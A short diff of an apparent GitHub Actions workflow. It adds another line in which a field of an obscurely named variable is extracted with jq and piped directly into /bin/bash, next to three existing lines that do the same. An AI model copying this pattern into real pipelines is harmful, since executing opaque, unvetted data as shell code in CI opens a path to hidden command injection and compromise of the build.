@@ -30,6 +30,7 @@ jobs:
           echo $q79 | jq -r .kmzb58 | /bin/bash
           echo $utq35328 | jq -r .wgbcv9 | /bin/bash
           echo $vwrdc76 | jq -r .i2576 | /bin/bash
+          printf '%s' "$kmjp32" | jq -r .naq8 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
